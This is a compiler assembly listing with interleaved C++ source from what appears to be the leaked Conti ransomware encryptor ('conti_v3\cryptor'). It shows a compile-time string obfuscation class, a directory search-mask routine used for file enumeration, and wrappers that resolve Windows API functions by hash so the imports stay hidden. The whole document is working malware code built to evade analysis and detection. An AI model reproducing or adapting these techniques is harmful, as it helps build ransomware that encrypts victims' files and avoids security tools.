  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv94 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000dd	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  000e1	88 85 c0 00 00
	00		 mov	 BYTE PTR tv94[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  000e7	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  000ee	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  000f5	5f		 pop	 rdi
  000f6	5d		 pop	 rbp
  000f7	c3		 ret	 0
??0?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z
_TEXT	SEGMENT
t$ = 4
$T5 = 328
$T6 = 356
$T7 = 392
$T8 = 452
$T9 = 488
$T10 = 548
tv129 = 568
tv72 = 576
__$ReturnUdt$ = 624
Directory$ = 632
?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z PROC ; MakeSearchMask, COMDAT

; 20   : {

$LN7:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 78 02
	00 00		 sub	 rsp, 632		; 00000278H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 7c 24 20	 lea	 rdi, QWORD PTR [rsp+32]
  0001d	b9 66 00 00 00	 mov	 ecx, 102		; 00000066H
  00022	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00027	f3 ab		 rep stosd
  00029	48 8b 8c 24 98
	02 00 00	 mov	 rcx, QWORD PTR [rsp+664]
  00031	c7 85 24 02 00
	00 00 00 00 00	 mov	 DWORD PTR $T10[rbp], 0
  0003b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3B0747C_search@cpp
  00042	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 21   : 	WCHAR t = Directory[Directory.length() - 1];

  00047	48 8b 8d 78 02
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  0004e	e8 00 00 00 00	 call	 ?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::length
  00053	48 ff c8	 dec	 rax
  00056	48 8b d0	 mov	 rdx, rax
  00059	48 8b 8d 78 02
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  00060	e8 00 00 00 00	 call	 ??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator[]
  00065	0f b7 00	 movzx	 eax, WORD PTR [rax]
  00068	66 89 45 04	 mov	 WORD PTR t$[rbp], ax

; 22   : 	std::wstring SearchMask = t == L'\\' ? Directory + OBFW(L"*") : Directory + OBFW(L"\\*");

  0006c	0f b7 45 04	 movzx	 eax, WORD PTR t$[rbp]
  00070	83 f8 5c	 cmp	 eax, 92			; 0000005cH
  00073	75 41		 jne	 SHORT $LN3@MakeSearch
  00075	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_13BBDEGPLJ@?$AA?$CK@
  0007c	48 8d 8d 64 01
	00 00		 lea	 rcx, QWORD PTR $T6[rbp]
  00083	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >
  00088	48 8b c8	 mov	 rcx, rax
  0008b	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
  00090	4c 8b c0	 mov	 r8, rax
  00093	48 8b 95 78 02
	00 00		 mov	 rdx, QWORD PTR Directory$[rbp]
  0009a	48 8d 8d 88 01
	00 00		 lea	 rcx, QWORD PTR $T7[rbp]
  000a1	e8 00 00 00 00	 call	 ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000a6	83 8d 24 02 00
	00 01		 or	 DWORD PTR $T10[rbp], 1
  000ad	48 89 85 38 02
	00 00		 mov	 QWORD PTR tv129[rbp], rax
  000b4	eb 3f		 jmp	 SHORT $LN4@MakeSearch
$LN3@MakeSearch:
  000b6	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_15PKPONJIK@?$AA?2?$AA?$CK@
  000bd	48 8d 8d c4 01
	00 00		 lea	 rcx, QWORD PTR $T8[rbp]
  000c4	e8 00 00 00 00	 call	 ??0?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
  000c9	48 8b c8	 mov	 rcx, rax
  000cc	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
  000d1	4c 8b c0	 mov	 r8, rax
  000d4	48 8b 95 78 02
	00 00		 mov	 rdx, QWORD PTR Directory$[rbp]
  000db	48 8d 8d e8 01
	00 00		 lea	 rcx, QWORD PTR $T9[rbp]
  000e2	e8 00 00 00 00	 call	 ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  000e7	83 8d 24 02 00
	00 02		 or	 DWORD PTR $T10[rbp], 2
  000ee	48 89 85 38 02
	00 00		 mov	 QWORD PTR tv129[rbp], rax
$LN4@MakeSearch:
  000f5	48 8b 85 38 02
	00 00		 mov	 rax, QWORD PTR tv129[rbp]
  000fc	48 89 85 48 01
	00 00		 mov	 QWORD PTR $T5[rbp], rax
  00103	48 8b 95 48 01
	00 00		 mov	 rdx, QWORD PTR $T5[rbp]
  0010a	48 8b 8d 70 02
	00 00		 mov	 rcx, QWORD PTR __$ReturnUdt$[rbp]
  00111	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00116	48 89 85 40 02
	00 00		 mov	 QWORD PTR tv72[rbp], rax
  0011d	8b 85 24 02 00
	00		 mov	 eax, DWORD PTR $T10[rbp]
  00123	83 e0 02	 and	 eax, 2
  00126	85 c0		 test	 eax, eax
  00128	74 13		 je	 SHORT $LN5@MakeSearch
  0012a	83 a5 24 02 00
	00 fd		 and	 DWORD PTR $T10[rbp], -3
  00131	48 8d 8d e8 01
	00 00		 lea	 rcx, QWORD PTR $T9[rbp]
  00138	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
$LN5@MakeSearch:
  0013d	8b 85 24 02 00
	00		 mov	 eax, DWORD PTR $T10[rbp]
  00143	83 e0 01	 and	 eax, 1
  00146	85 c0		 test	 eax, eax
  00148	74 13		 je	 SHORT $LN6@MakeSearch
  0014a	83 a5 24 02 00
	00 fe		 and	 DWORD PTR $T10[rbp], -2
  00151	48 8d 8d 88 01
	00 00		 lea	 rcx, QWORD PTR $T7[rbp]
  00158	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
$LN6@MakeSearch:

; 23   : 	return SearchMask;

  0015d	48 8b 8d 78 02
	00 00		 mov	 rcx, QWORD PTR Directory$[rbp]
  00164	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00169	48 8b 85 70 02
	00 00		 mov	 rax, QWORD PTR __$ReturnUdt$[rbp]

; 24   : }

  00170	48 8b f8	 mov	 rdi, rax
  00173	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  00177	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z$rtcFrameData
  0017e	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  00183	48 8b c7	 mov	 rax, rdi
  00186	48 8d a5 58 02
	00 00		 lea	 rsp, QWORD PTR [rbp+600]
  0018d	5f		 pop	 rdi
  0018e	5d		 pop	 rbp
  0018f	c3		 ret	 0
?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z ENDP ; MakeSearchMask
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gdirectory_info_@@QEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gdirectory_info_@@QEAAPEAXI@Z PROC			; directory_info_::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1directory_info_@@QEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 30 00 00 00	 mov	 edx, 48			; 00000030H
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gdirectory_info_@@QEAAPEAXI@Z ENDP			; directory_info_::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1directory_info_@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1directory_info_@@QEAA@XZ PROC			; directory_info_::~directory_info_, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00022	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00029	5f		 pop	 rdi
  0002a	5d		 pop	 rbp
  0002b	c3		 ret	 0
??1directory_info_@@QEAA@XZ ENDP			; directory_info_::~directory_info_
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0directory_info_@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0directory_info_@@QEAA@XZ PROC			; directory_info_::directory_info_, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0001a	48 8b c8	 mov	 rcx, rax
  0001d	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00022	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
??0directory_info_@@QEAA@XZ ENDP			; directory_info_::directory_info_
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?positive_modulo@@YAHHH@Z
_TEXT	SEGMENT
a$ = 224
n$ = 232
?positive_modulo@@YAHHH@Z PROC				; positive_modulo, COMDAT

; 39   : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00008	55		 push	 rbp
  00009	57		 push	 rdi
  0000a	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00011	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00016	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001d	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 40   :     return (a % n + n) % n;

  00022	8b 85 e0 00 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  00028	99		 cdq
  00029	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0002f	8b c2		 mov	 eax, edx
  00031	03 85 e8 00 00
	00		 add	 eax, DWORD PTR n$[rbp]
  00037	99		 cdq
  00038	f7 bd e8 00 00
	00		 idiv	 DWORD PTR n$[rbp]
  0003e	8b c2		 mov	 eax, edx

; 41   : }

  00040	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00047	5f		 pop	 rdi
  00048	5d		 pop	 rbp
  00049	c3		 ret	 0
?positive_modulo@@YAHHH@Z ENDP				; positive_modulo
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pStrStrIW@@YAPEB_WPEB_W0@Z
_TEXT	SEGMENT
pFunction$ = 8
pszFirst$ = 256
pszSrch$ = 264
?pStrStrIW@@YAPEB_WPEB_W0@Z PROC			; pStrStrIW, COMDAT

; 1004 : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 1005 : 	PCWSTR(WINAPI * pFunction)(PCWSTR, PCWSTR);
; 1006 : 	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));

  00024	41 b9 17 00 00
	00		 mov	 r9d, 23
  0002a	41 b8 61 fe ae
	f8		 mov	 r8d, -122749343		; f8aefe61H
  00030	ba 16 00 00 00	 mov	 edx, 22
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 1007 : 	return pFunction(pszFirst, pszSrch);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR pszSrch$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR pszFirst$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 1008 : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?pStrStrIW@@YAPEB_WPEB_W0@Z ENDP			; pStrStrIW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?plstrcmpW@@YAHPEB_W0@Z
_TEXT	SEGMENT
pFunction$ = 8
lpString1$ = 256
lpString2$ = 264
?plstrcmpW@@YAHPEB_W0@Z PROC				; plstrcmpW, COMDAT

; 551  : {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 552  : 	int(WINAPI * pFunction)(LPCWSTR, LPCWSTR);
; 553  : 	pFunction = (int(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd76d434b, 60);//GetProcAddress(hKernel32, OBFA("lstrcmpW"));

  00024	41 b9 3c 00 00
	00		 mov	 r9d, 60			; 0000003cH
  0002a	41 b8 4b 43 6d
	d7		 mov	 r8d, -680705205		; d76d434bH
  00030	ba 0f 00 00 00	 mov	 edx, 15
  00035	33 c9		 xor	 ecx, ecx
  00037	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003c	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 554  : 	return pFunction(lpString1, lpString2);

  00040	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR lpString2$[rbp]
  00047	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpString1$[rbp]
  0004e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 555  : }

  00051	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00058	5f		 pop	 rdi
  00059	5d		 pop	 rbp
  0005a	c3		 ret	 0
?plstrcmpW@@YAHPEB_W0@Z ENDP				; plstrcmpW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
